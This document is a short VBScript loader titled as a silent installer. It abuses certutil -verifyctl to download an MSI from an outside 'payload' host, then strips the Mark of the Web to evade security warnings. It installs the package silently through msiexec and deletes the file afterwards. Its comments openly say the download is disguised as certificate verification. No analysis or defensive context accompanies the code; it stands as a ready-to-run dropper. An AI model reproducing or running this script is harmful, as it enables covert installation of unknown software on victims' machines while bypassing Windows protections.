' SILENT INSTALLER - CERTUTIL VERIFYCTL BYPASS
Option Explicit

Dim shell, fso, url, localPath, zoneIdPath, cmd, file
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
zoneIdPath = localPath & ":Zone.Identifier"

' DOWNLOAD USING CERTUTIL -VERIFYCTL (TRUSTED SYSTEM TOOL)
' This mimics certificate verification, not malware download
cmd = "cmd.exe /c certutil -verifyctl -split -f """ & url & """ """ & localPath & """"
shell.Run cmd, 0, True ' Wait for download to complete

' REMOVE MARK OF THE WEB (CRITICAL FOR SILENT INSTALL)
If fso.FileExists(zoneIdPath) Then
    fso.DeleteFile zoneIdPath, True
End If

' VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
If fso.FileExists(localPath) Then
    Set file = fso.GetFile(localPath)
    If file.Size > 1000000 Then
        ' INSTALL SILENTLY VIA MSIEXEC
        ' /quiet = no UI, /norestart = no reboot prompt
        shell.Run "msiexec.exe /i """ & localPath & """ /quiet /norestart", 0, True
        
        ' CLEANUP TEMP FILE AFTER INSTALL
        If fso.FileExists(localPath) Then
            fso.DeleteFile localPath, True
        End If
    End If
End If

' EXIT CLEANLY
WScript.Quit 0
